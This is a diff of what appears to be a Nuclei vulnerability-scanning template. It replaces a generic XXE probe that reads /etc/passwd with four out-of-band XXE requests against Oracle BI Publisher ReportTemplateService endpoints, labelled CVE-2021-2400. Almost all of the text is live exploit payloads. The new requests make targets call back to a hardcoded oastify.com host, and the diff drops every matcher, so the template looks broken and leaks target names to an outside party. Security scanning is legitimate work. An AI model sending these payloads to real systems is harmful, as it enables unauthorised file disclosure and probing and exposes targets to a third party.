@@ -1,33 +1,37 @@
-id: Bruteforce-xxe
+id: CVE_2021_2400
 
 info:
-  name: Generic Bruteforce XXE
-  author: vijay
-  severity: high
-  tags: xxe,generic,blind
-  metadata:
-    max-request: 1
-
-http:
+  name: CVE-2021–2400
+  author: Excis3
+  severity: Critical
+  description: Discover services to Executes an XXE attack
+  
+requests:
   - raw:
-      - |
-        POST  HTTP/1.1
+    - |
+        POST /xmlpserver/ReportTemplateService.xls HTTP/1.1
         Host: {{Hostname}}
-        Accept: text/html,application/xhtml+xml,application/xml,text/xml;q=0.9,*/*;q=0.8
-        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36
-        Content-Type: application/xml
-        Referer: {{BaseURL}}
-        Pragma: no-cache
+        Content-Type: text/xml; charset=UTF-8
 
-        <?xml version="1.0" encoding="UTF-8"?>
-        <!DOCTYPE foo [
-        <!ELEMENT foo ANY>
-        <!ENTITY xxe SYSTEM "file:///etc/passwd">]>
-        <foo>&xxe;</foo>
+        <!DOCTYPE soap:envelope PUBLIC '-//B/A/EN' 'http://{{Hostname}}.1.mf520mex38vlddi7gbzc2g2jpav4ju7j.oastify.com'>
 
-    matchers-condition: and
-    matchers:
-      - type: regex
-        part: body
-        regex:
-          - "root:.*:0:0:"
+    - |
+        POST /xmlpserver/services/x/ReportTemplateService.xls  HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: text/xml; charset=UTF-8
+
+        <!DOCTYPE soap:envelope PUBLIC '-//B/A/EN' 'http://{{Hostname}}.2.mf520mex38vlddi7gbzc2g2jpav4ju7j.oastify.com'>
+
+    - |
+        POST /mobile/ReportTemplateService.xls HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: text/xml; charset=UTF-8
+
+        <!DOCTYPE soap:envelope PUBLIC '-//B/A/EN' 'http://{{Hostname}}.3.mf520mex38vlddi7gbzc2g2jpav4ju7j.oastify.com'>
+
+    - |
+        POST /mobile/services/x/ReportTemplateService.xls HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: text/xml; charset=UTF-8
+
+        <!DOCTYPE soap:envelope PUBLIC '-//B/A/EN' 'http://{{Hostname}}.4.mf520mex38vlddi7gbzc2g2jpav4ju7j.oastify.com'>
